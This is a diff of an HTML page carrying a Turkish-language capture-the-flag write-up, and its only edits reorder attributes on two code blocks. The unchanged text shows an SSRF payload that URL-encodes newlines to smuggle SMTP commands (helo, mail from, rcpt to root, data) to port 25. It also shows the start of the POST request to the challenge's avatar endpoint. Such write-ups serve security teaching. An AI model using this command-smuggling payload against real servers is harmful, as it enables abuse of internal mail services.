@@ -110,12 +110,12 @@ Sunulan bedava kuponu almak uzere donate sayfasini gittik.</p>
 </span>
 </code></pre>
 <p>Yeni satır ayıracı <strong>SMTP</strong>'de delimiter olduğu için her satırın sonuna yeni satırın <strong>URL Encoded</strong> hali olan <strong>%0A</strong>'yı ekledik ve son payloadımızın son hali</p>
-<pre style="background-color:#fdf6e3;" lang="url"><code>
+<pre lang="url" style="background-color:#fdf6e3;"><code>
 <span style="color:#657b83;">[0.0.0.0%0ahelo 1v3m%0amail from:&lt;qaewjlfnwej@o3enzyme.com&gt;%0arcpt to:&lt;root&gt;%0adata%0asubject: give me flag%0a%0a1v3m%0a.%0a]:25
 </span>
 </code></pre>
 <p><strong>Request</strong>'imizin son hali şöyle oldu:</p>
-<pre lang="http" style="background-color:#fdf6e3;"><code>
+<pre style="background-color:#fdf6e3;" lang="http"><code>
 <span style="color:#657b83;">POST /user/avatar HTTP/1.1
 </span><span style="color:#657b83;">Host: web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one
 </span><span style="color:#657b83;">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
